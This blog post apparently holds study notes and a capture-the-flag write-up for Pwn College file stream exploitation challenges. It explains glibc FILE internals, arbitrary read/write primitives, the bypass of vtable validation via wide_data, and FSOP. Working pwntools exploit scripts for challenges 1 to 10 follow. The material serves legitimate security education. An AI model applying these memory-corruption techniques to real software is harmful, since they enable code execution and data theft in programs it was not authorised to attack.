---
layout: post
title:  "Pwn College - File Stream Exploitation"
date:   2024-05-19 19:59:45 +0300
categories: jekyll update
---

**Contents**
* TOC
{:toc}
## Overview

Recall how file descriptors work. \
A `fd` is just an entry within the `process file table` in the kernel. The `process file table` entries contains pointers to the kernel's `global file table`, which aggregates all open files within the system. An entry within the `global file table` contains the `file struct`, as well as `inode ptr`, `offset` (where in the file we're currently accessing) and more. \
Every time we would issue `read, write` operations, a context switch would be performed, and all of the above dereference chain would be triggered - non trivial amount of work. 

File streams are a libc optimization mechanism. The most notable API - `fopen, fread, fwrite`. Instead of working on `fd`s, they operate on file streams. \
The idea is instead of issuing lots of `read` or `write` syscalls, use an intermediate userspace buffer. This buffer is usually of fixed size (`~0x1000` bytes), allocated on the heap during the call to `fopen`. By doing so, instead of performing `read` syscall for every `0x20` bytes, we can do a single read syscall that would read `0x1000` bytes into the intermediate buffer, returning `0x20` bytes for every `fread` request. 

Part of its implementation, can be found under `struct_FILE.h`:

```c
struct _IO_FILE
{
  int _flags;		/* High-order word is _IO_MAGIC; rest is flags. */

  /* The following pointers correspond to the C++ streambuf protocol. */
  char *_IO_read_ptr;	/* Current read pointer */
  char *_IO_read_end;	/* End of get area. */
  char *_IO_read_base;	/* Start of putback+get area. */
  char *_IO_write_base;	/* Start of put area. */
  char *_IO_write_ptr;	/* Current put pointer. */
  char *_IO_write_end;	/* End of put area. */
  char *_IO_buf_base;	/* Start of reserve area. */
  char *_IO_buf_end;	/* End of reserve area. */
  ...
  int _fileno;
}
```

`_fileno` denotes the underlying open file descriptor. 

`flags` denotes whether the file was opened to read, write or both. 

`_IO_buf_base, _IO_buf_end` - related to the heap's allocated intermediate buffer. They store the start and end of this allocation. 

For the rest of the pointers, `_base` denotes the beggining of a region (read / write), `_end` the end of a region, and `_ptr` the current location we're working with. 

When we call `fread`, the program actually accesses the intermediate buffer. \
For the first read request, the buffer gets filled with about `0x1000` bytes. \
Both `_read_ptr, _read_base` are initially pointing to `_buf_base`, while `_read_end` to `_buf_end`. \
For every `fread` request, `_read_ptr` would be incremented. \
At some point, we would reach the end of the file - `_read_end`, which may be less than `_buf_end` in case the file size isn't aligned to the allocated interemediate buffer size. \
`fwrite` operates in a similar manner. Just recall the bytes stored within `_write_base` up to `_write_ptr` actually denotes the bytes **to-be-written** into the file. Only once the intermediate buffer would be filled, or a `flush` operation would be requested, the bytes would be actually written to the file.

## Arbitrary R/W

First, we'd have to set the `flags` values to allow read or write operations. This includes setting the `_IO_MAGIC = 0xFBAD0000`, and the correct operation flag, whether `_IO_NO_READS` or `_IO_NO_WRITES`. \
Also notice there's `_IO_UNBUFFERED` magic, which would bypass R/W operations within the intermediate buffer.

### Arbitrary Write - Reading from stream to Arbitrary Memory

May be abit confusing, `read` is actually operation that writes data **into** memory. Hence, allows a write primitive. 

The idea is simple. We would trick the stream to "think" it have reached the read buffer end, hence needs to fetch another chunk into the intermediate buffer. \
By corrupting the interemediate buffer pointers, the data read from the stream would be written to memory of our wish. 

Requirements:

1. Adequate `flags` value for read

2. `read_ptr = read_end`

3. `buf_base = target_addr`

4. `buf_end = buf_base + length`

5. `buf_end - buf_base >= requested_bytes_to_read`

Clarification - `buf_end - buf_base` actually denotes the size of the intermediate buffer. Since streams reads chunks by filling the intermediate buffer, this size denotes the actual amount of bytes that would be read. \
Moreover, `requested_bytes_to_read` are the actual number of bytes requsted by the program's `fread` call. In case this amount would've been larger than the intermediate buffer size, one of two bad scenarios would be happening:

1. The intermediate buffer woulv'e been re-allocated

2. The destination buffer wouldv'e been written-on multiple times, overwriting itself. For example, for a buffer of length 0x20 and `fread` request of `0x30` bytes, the buffer would be filled, copied to the real destination, and filled with the rest of `0x10` bytes. This would destroy our write primitive. 

That's why it is important to make sure the size of the intermediate buffer is for sure larger than the requested size by the commercial stream function. 

Notice - **ALL** of the requirements can be supplied by simply setting all pointers to `NULL`, while pointing `buf_base` to target and `buf_end` to `target + target_length`. \
This is because libc does simple checks, such as `read_ptr == read_end` (which is satisfied in the case of both `NULL`..)

### Arbitrary Read - Writing from Arbitrary Memory to Stream

The idea is to put the stream into a state where it thinks it must flush the intermediate buffer. \
We would trick the `write` ptrs to our leak, hence it would be flushed into the stream. 

Requirements: 

1. Adequate `flags` for writing 

2. `write_base` as the memory to be leaked

3. `write_ptr` as `write_base + length`, where `length` is the amount of bytes we'd like to leak

4. `read_end == write_base` - libc constraint to cause flush. 

5. `buf_end - buf_base` >= `requested_bytes_to_write`. 

Notice - next bytes would be written right past the `write_ptr`. We would have to cause multiple writes in order to fill the buffer, and trigger the flush. 

We can achieve the arbitrary read primitive by setting all pointers to `NULL`, except for the `write_base, read_end` to point towards our leak, and `write_end` to its end. \

### File_plus and the Vtable

A very cool trick, that may be used in order to gain branch primitive. \
`struct _IO_FILE_plus` is an extension of the traditional `struct _IO_FILE`. The only different is one extra pointer appended to the end of the struct:

```c
struct _IO_FILE_plus
{
  FILE file;
  const struct _IO_jump_t *vtable;
}
```

This `vtable` is not C++'s polymorphic vtable, but a very similar concept. This is a  bunch of function pointers in memory, that allows dynamic resolution at runtime. \
If we would create our own fake vtable (whether on the stack on the heap), we could set at the desired offset a goal method of our wish. All we need is to overwrite the `vtable` ptr to our own fake vtable, gaining a branch primitive. 

For the case of linear heap overflows, we might be needed to overwrite some parts of its `struct FILE`. \
While we can still fake most fields, overwriting the `_IO_lock_t *_lock` member may be problematic. This is a pointer that is used in order to manage multithreaded access to file stream. We can bypass this by setting `_lock` to some **writeable** memory region, having the value of `0` (meaning, the lock isn't held). 

If that's not enough, modern libc contains an extra mitigation - vtable pointer validation step. Commercially, libc stores vtables within a dedicated region to contain only vtable. For every such access into a stream's vtable, a validation would occur that the overwritten `vtable` value resides within that special region. \
We can bypass this, by making sure our fake vtable pointer points to somewhere within that vtable area. Interestingly, as this region contains multiple vtables, we can change the vtable pointer to point to a different vtable, or even a strange offset. That way, we have control on which functions would be called, but wer'e restricted to functions within that vtable area. \
A common function within that region is `IO_wfile_overflow`. Internally, it calls `do_allocbuf`, which uses ANOTHER vtable, but this time without any verification being made. This vtable located within `file->wide_data`. \
The `wide_data` was created to handle wide character streams, for example unicode, and it contains fields very similar to `struct FILE`, including a vtable. 

To finalize, our steps:

1. Set `file.wide_data->vtable` to point to our `fake_vtable`. 

2. Set `file.vtable` such that `IO_wfile_overflow` would get called. 

`do_allocbuf` would now be called, which would call into `wide_data` vtable without verfication. 

Indeed, if we check out `fwrite` internals, we can see it calls `[vtable + 0x38]`, which stands for the virtual method `_IO_new_file_xsputn`. \
Notice that sometimes we won't have enough controlled memory to generate fake `wide_data, file`, and their vtables. In that case, we can use overlapping structs, so we would place only the values that are being accessed, making sure they won't overlap. 

### FSOP

File structs are chained in a linked list, via the `_chain` member. \
The goal behind this, is to support buffers flush at the end of the program. `stdin, stdout, stderr` would appear at the end of the list. 

The act of flushing streams relies on virtual methods. \
Moreover, streams gets flush on `exit` according to their order within the linked list. Hence, overwriting `FILE` vtables in sequence can call arbitrary sequence (such as rop gadgets). 

### Angry FSROP

Interesting blog post regarding the use of `angr` with `FSOP`, can be found [here][angry-fsrop]. \
In short, the idea is to use `angr` in order to emulate the program's run, to find larger candidates for the special vtable-only space within libc. 

The real brain-wrecking stuff is that some small part of the discovered chains do not rely on the fact `_wide_vtable` isn't being validated. 

### Pwntools - FileStructure

Pwntools exports a convenient way to exploit file streams. \
We can generate `fp = FileStructure()` object, which would represent the native `struct FILE` of our desired platform (mostly, we would like to set `context.arch = 'amd64'`). \
We can set values manually, for example by using `fp.flags = 0xfbad0000`. \
We can also retrieve the bytes representing this object by calling `bytes(fp)`. 

Moreover, pwntools exports the ability to perform the R/W operations on the stream. For example, by calling `fp.read(target, targetLength)`, a file object with the appropriate values for the underlying pointers would be returned, such that the WRITE primitive would occur on the `target`. Notice `targetLength` must be larger than the amount of bytes requsted by `fread`, as it actually represents the size of the intermediate buffer. 

Another interesting feature of Pwntools is `FileStructure.struntil()` - which generates a `fp` object until certain members. \
May come handy, incase our primitive is a linear heap overwrite, and we wouldn't like to overwrite other members, such as `_lock`. 

## Challenge 1

Trivial, set all pointers to `NULL`, except for `read_end`, `write_base` to point to the leak, as well as `write_end` to the amount of bytes to be leaked. 

```python
p = process(BINARY)
p.recvuntil(b'is located at ')
flag_addr = int(p.recvline()[:-1], 16)
print(f'Flag addr:{flag_addr}')
p.recvuntil(b'from stdin directly to the FILE struct.\n')

fp = FileStructure()
fp_bytes = fp.write(flag_addr, 60)
print(f'fp_bytes:{fp_bytes} len:{len(fp_bytes)}')

p.send(fp_bytes)
p.recvuntil(b'Here is the contents of the FILE structure.\n')
p.interactive()
```

Good to mention - `read()` issued by the program actually reads 480 bytes. We have to verify sequential ordering while sending input to the program. 

## Challenge 2

Notice the underlying call of the challenge (can be found via `strace`):

```bash
read(3, "FLAG{NOT_HAPPENING}\n", 4096)  = 20                
```

Hence, we'd need to supply intermediate buffer of at least 0x1000 bytes long - I've chose 0x1100. \
Moreover, notice that after we'd overwrite the file stream, the program would wait for an input of `0x1000` bytes from `stdin`. Because a flash would occur only in case the whole buffer is filled, I've supplied an input corresponding to the size of the intermediate buffer.  

```python
p = process(BINARY)

target_addr = binary.symbols['authenticated']
print(f'Target addr: {target_addr}')
p.recvuntil(b'from stdin directly to the FILE struct.\n')
buffer_size = 0x1100
flags2_offset = 0x74

fp = FileStructure()
fp.flags = 0xfbad2488
fp._IO_buf_base = target_addr
fp._IO_buf_end = target_addr + buffer_size
fp.fileno = 0

fp_bytes = bytes(fp)[:flags2_offset]
print(f'fp_bytes:{fp_bytes} len:{len(fp_bytes)}')

p.send(fp_bytes)
p.recvuntil(b'Here is the contents of the FILE structure.\n')
p.send(b'A' * buffer_size)
p.interactive()
```

## Challenge 3

This challenge is too easy, making it being tricky. \
Now we can write directly to the `fileno` attribute, not linear heapoverflow from the start of the file stream. \
Initially, the flag is being read from `"/tmp/babyflag.txt"` via `fread`. Before this `fp` is closed, `fp2` to the exact file is also being opened. \
We acquire a leak of the value of `fp2->fileno`, which is usually `4`, and therefore `fp->fileno` is usually `3`. We can overwrite only the `fileno` member of the original `fp`, before `fwrite` is being called. 

Hence, if we would overwrite `fp->fileno` to `STDOUT_FILENO = 1`, the `fwrite` call should leak the flag. 

```python
p = process(BINARY)
p.send(b'\x01')
p.interactive()
```

Pathetic. 

## Challenge 4

Now we'd like to redirect code flow to the `win` function, with a single write primitive. We can do so by writing the GOT entry of `puts` (or `__stack_chk_fail`, if we can corrupt the stack intentionally). \
Apparently we're given a leak of the return address, but since this is partial RELRO we don't need it.

```python
p.recvuntil(b'at: ')
ra_addr = int(p.readline()[:-1], 16)

win_addr = binary.symbols['win']
target_addr = ra_addr
print(f'Target addr: {hex(target_addr)}')
buffer_size = 0x108
fileno_offset = 0x70
flags2_offset = 0x74

fp = FileStructure()
fp.flags = 0xfbad2488
fp._IO_buf_base = target_addr
fp._IO_buf_end = target_addr + buffer_size
fp.fileno = 0
fp_bytes = bytes(fp)[:flags2_offset]
print(f'fp_bytes:{fp_bytes} len:{len(fp_bytes)}')

p.send(fp_bytes)
p.recvuntil(b'Here is the contents of the FILE structure.\n')

stdin_input = struct.pack('<Q', win_addr)
stdin_input += b'A' * (buffer_size - len(stdin_input))
p.send(stdin_input)
p.interactive()
```

## Challenge 5

We can now overwrite `stdout` file stream. \
Notice the buffer size can be pretty small, as the libc call that actually being used to perform the streamed-write isn't `fwrite` from some large buffer, but a greeting `puts` call (which under the hood uses streamed-write to `stdout`). 

```python
p = process(BINARY)
target_addr = binary.symbols['secret']
buffer_size = 0x50
fp = FileStructure()
fp_bytes = fp.write(target_addr, buffer_size)
p.recvuntil(b'to the FILE struct.\n')
p.send(fp_bytes)
p.interactive()
```

## Challenge 6

In a similar manner, now we'd like to exploit `stdin` file stream. 

```python
p = process(BINARY)
target_addr = binary.symbols['authenticated']
buffer_size = 0x50
fp = FileStructure()
fp_bytes = fp.read(target_addr, buffer_size)
p.recvuntil(b'to the FILE struct.\n')
p.send(fp_bytes)

p.recvuntil(b'Here is the contents of the FILE structure.\n')
stdin_input = b''
stdin_input += b'A' * (buffer_size - len(stdin_input))
p.send(stdin_input)
p.interactive()
```

## Challenge 7

Now stuff gets interesting. \
We'd like to overwrite the `wide_data` member of the file, in order to change control flow. 

The naive plan is simple - create `FILE file` and `wide_data` by generating two separate instances of `FileStream`. \
Then, generate `file.vtable`, making sure its entry at offset `0x38` (as this offset would be used by `fwrite`) actually overwritten to `_IO_wfile_overflow`. Also make sure the `_lock` points to a valid `NULL` value. \
Moreover, generate `wide_data.vtable`, now having the address of `win` function within its correct offset. \
So to sum up, we would fake 2 vtables and 2 `FILE` objects. For now, none of these would overlap. 

The program reads a name buffer to the heap, of up to `256` bytes long. Then it reads the full file stream, and finally uses `fwrite` of `256` bytes on the newly-opened stream. \
Notice the vtable offset within `wide_data`, as well as the accessed method offset, differs from `file`'.s 


```python
p = process(BINARY)
p.recvuntil(b'is: ')
puts_libc_addr = int(p.readline()[:-1], 16)
libc_base = puts_libc_addr - libc.symbols['puts']
assert(libc_base & 0xfff == 0)

p.recvuntil(b'at: ')
name_buf_addr = int(p.recvline()[:-1], 16)
print(f'libc_base: {hex(libc_base)} name_buf_addr: {hex(name_buf_addr)}')
win_addr = binary.symbols['win']
print(f'win_addr: {hex(win_addr)}')
fake_lock_addr = 0x4040e0  # we'd use the place where flag is as the lock :)
print(f'fake_lock_addr: {hex(fake_lock_addr)}')

fake_vtable_addr = libc_base + 0x1e88a0 + 1368 - 0x38  # first component is offset to the vtables array, second to the _IO_wfile_overflow, and third to support [vptr+0x38] adjustment
fp = FileStructure()
fp.flags = 0xfbad8484
fp._wide_data = name_buf_addr - 0xe0  # subtract so we would only point to the vtable
fp._lock = fake_lock_addr
fp.vtable = fake_vtable_addr  # sub the offset to _IO_new_file_xsputn
fp_bytes = bytes(fp)
print(f'fp: {fp} fp_bytes: {fp_bytes} len: {len(fp_bytes)}')
    
wide_vtable_addr = name_buf_addr + 8

name_buf = b''
name_buf += struct.pack('<Q', wide_vtable_addr - 0x68)
name_buf += struct.pack('<Q', win_addr)

p.recvuntil(b'your name.\n')
p.send(name_buf)

p.recvuntil(b'to the FILE struct.\n')
p.send(fp_bytes)

p.interactive()
```

## Challenge 8

Similar to before, but this time we're not given an extra input buffer. \
This means we have to store all tables, pointers, fake `wide_data`, within the file stream itself. 

```python
p = process(BINARY)
p.recvuntil(b'is: ')
puts_libc_addr = int(p.readline()[:-1], 16)
libc_base = puts_libc_addr - libc.symbols['puts']
assert(libc_base & 0xfff == 0)

p.recvuntil(b'to: ')
stream_addr = int(p.recvline()[:-1], 16)

print(f'libc_base: {hex(libc_base)} stream_addr: {hex(stream_addr)}')
win_addr = binary.symbols['win']
print(f'win_addr: {hex(win_addr)}')
fake_lock_addr = 0x4040e0  # we'd use the place where flag is as the lock :)
print(f'fake_lock_addr: {hex(fake_lock_addr)}')

fake_vtable_addr = libc_base + 0x1e88a0 + 1368 - 0x38  # first component is offset to the vtables array, second to the _IO_wfile_overflow, and third to support [vptr+0x38] adjustment
fp = FileStructure()
fp.flags = 0xfbad8484
fp._IO_read_ptr = stream_addr - 0xe0 - 0x68 + 224 + 16  # fake vtable
fp._IO_read_end = win_addr
fp._wide_data = stream_addr - 0xe0 + 8 # subtract so we would only point to the vtable
fp._lock = fake_lock_addr
fp.vtable = fake_vtable_addr  # sub the offset to _IO_new_file_xsputn
fp_bytes = bytes(fp)
print(f'fp: {fp} fp_bytes: {fp_bytes} len: {len(fp_bytes)}')
p.send(fp_bytes)
```

## Challenge 9

Now we overwrite a builtin file stream (`stdout`). \
Moreover, there's no `win` method, but the binary is partial RELRO. This means I can gain control flow by overwriting some GOT entry to my desire, such as `chmod`. 
Notice - all vtable methods are being called having `fp` as their first argument.

By further reading, I've seen theres an `authenticate` method. By adjusting the symbol resolving to this method, the flag was granted in a similar manner to challenge 8.

The main takeaway from this challenge is that `authenticate` calls `chmod`, and the printing doesn't occurs. \
This is due to `stdout` being completely corrupted. 

## Challenge 10

Similar to before, but now `authenticate` verifies `fp` (which is being used as the first parameter of the virtual call) points to `"password"` string. \
I've adjusted abit the exploit, and set the string within the `flags` argument.

```python
fp.flags = 0x64726f7773736170
fp._IO_read_ptr = 0
fp._IO_read_end = stream_addr - 0xe0 - 0x68 + 224 + 24  # fake vtable
fp._IO_read_base = win_addr
```

Rest of the exploit remained the same. 

## Challenge 11




[angry-fsrop]: https://blog.kylebot.net/2022/10/22/angry-FSROP